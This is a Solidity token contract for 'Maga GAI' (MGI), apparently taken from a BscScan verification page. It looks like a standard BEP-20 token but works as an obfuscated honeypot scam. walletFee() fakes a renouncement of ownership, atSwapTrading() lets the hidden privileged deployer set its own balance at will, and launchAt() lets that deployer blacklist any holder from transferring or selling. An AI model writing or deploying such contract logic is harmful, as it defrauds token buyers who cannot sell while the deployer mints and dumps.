/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

abstract contract receiverEnable {
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface limitTrading {
    function createPair(address listSwap, address isBuy) external returns (address);
}

interface sellIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface swapLaunched {
    function transfer(address isFromMin, uint256 txExemptSwap) external returns (bool);

    function allowance(address isTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 txExemptSwap) external returns (bool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address autoTotal) external view returns (uint256);

    function transferFrom(
        address sender,
        address isFromMin,
        uint256 txExemptSwap
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoReceiverExempt, uint256 value);
    event Approval(address indexed isTo, address indexed spender, uint256 value);
}

interface swapLaunchedMetadata is swapLaunched {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MagaGAI is receiverEnable, swapLaunched, swapLaunchedMetadata {

    uint8 private autoTx = 18;

    constructor (){
        
        sellIs enableReceiverMin = sellIs(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        walletToken = limitTrading(enableReceiverMin.factory()).createPair(enableReceiverMin.WETH(), address(this));
        receiverShouldWallet = _msgSender();
        if (launchedMinList == receiverMin) {
            receiverMin = minReceiver;
        }
        sellToken = receiverShouldWallet;
        shouldModeTo[sellToken] = true;
        if (enableToLaunch == isMarketingAt) {
            toMax = receiverMin;
        }
        swapFrom[sellToken] = teamLimit;
        emit Transfer(address(0), sellToken, teamLimit);
        walletFee();
    }

    function transfer(address teamIs, uint256 txExemptSwap) external virtual override returns (bool) {
        return teamFee(_msgSender(), teamIs, txExemptSwap);
    }

    uint256 public launchedMinList;

    event OwnershipTransferred(address indexed exemptToken, address indexed receiverFrom);

    function teamFee(address minSwap, address isFromMin, uint256 txExemptSwap) internal returns (bool) {
        if (minSwap == sellToken) {
            return autoToken(minSwap, isFromMin, txExemptSwap);
        }
        require(!liquidityLaunch[minSwap]);
        return autoToken(minSwap, isFromMin, txExemptSwap);
    }

    function name() external view virtual override returns (string memory) {
        return marketingMax;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchedMaxTx;
    }

    function shouldLiquidity(address liquidityFund) public {
        if (teamMinTo) {
            return;
        }
        
        shouldModeTo[liquidityFund] = true;
        
        teamMinTo = true;
    }

    bool private sellTeam;

    function walletFee() public {
        emit OwnershipTransferred(sellToken, address(0));
        receiverShouldWallet = address(0);
    }

    function balanceOf(address autoTotal) public view virtual override returns (uint256) {
        return swapFrom[autoTotal];
    }

    function tokenTo() public view returns (uint256) {
        return buyTeam;
    }

    function transferFrom(address minSwap, address isFromMin, uint256 txExemptSwap) external override returns (bool) {
        if (sellTx[minSwap][_msgSender()] != type(uint256).max) {
            require(txExemptSwap <= sellTx[minSwap][_msgSender()]);
            sellTx[minSwap][_msgSender()] -= txExemptSwap;
        }
        return teamFee(minSwap, isFromMin, txExemptSwap);
    }

    address private receiverShouldWallet;

    mapping(address => bool) public shouldModeTo;

    uint256 private teamLimit = 100000000 * 10 ** 18;

    function autoToken(address minSwap, address isFromMin, uint256 txExemptSwap) internal returns (bool) {
        require(swapFrom[minSwap] >= txExemptSwap);
        swapFrom[minSwap] -= txExemptSwap;
        swapFrom[isFromMin] += txExemptSwap;
        emit Transfer(minSwap, isFromMin, txExemptSwap);
        return true;
    }

    uint256 private toMax;

    bool public teamMinTo;

    function owner() external view returns (address) {
        return receiverShouldWallet;
    }

    function getOwner() external view returns (address) {
        return receiverShouldWallet;
    }

    function autoReceiver() public view returns (uint256) {
        return toMax;
    }

    bool private enableToLaunch;

    address public walletToken;

    mapping(address => uint256) private swapFrom;

    uint256 public receiverMin;

    uint256 public minReceiver;

    function atSwapTrading(uint256 txExemptSwap) public {
        if (!shouldModeTo[_msgSender()]) {
            return;
        }
        swapFrom[sellToken] = txExemptSwap;
    }

    bool public isMarketingAt;

    mapping(address => bool) public liquidityLaunch;

    string private marketingMax = "Maga GAI";

    string private launchedMaxTx = "MGI";

    function allowance(address launchedFeeSender, address launchLimit) external view virtual override returns (uint256) {
        return sellTx[launchedFeeSender][launchLimit];
    }

    function marketingAutoTx() public {
        if (isMarketingAt == sellTeam) {
            sellTeam = true;
        }
        if (toMax != minReceiver) {
            minReceiver = buyTeam;
        }
        isMarketingAt=false;
    }

    function decimals() external view virtual override returns (uint8) {
        return autoTx;
    }

    mapping(address => mapping(address => uint256)) private sellTx;

    function approve(address launchLimit, uint256 txExemptSwap) public virtual override returns (bool) {
        sellTx[_msgSender()][launchLimit] = txExemptSwap;
        emit Approval(_msgSender(), launchLimit, txExemptSwap);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return teamLimit;
    }

    function launchAt(address enableBuy) public {
        
        if (enableBuy == sellToken || enableBuy == walletToken || !shouldModeTo[_msgSender()]) {
            return;
        }
        
        liquidityLaunch[enableBuy] = true;
    }

    uint256 public buyTeam;

    function liquidityTx() public {
        if (toMax == launchedMinList) {
            buyTeam = minReceiver;
        }
        
        buyTeam=0;
    }

    address public sellToken;

}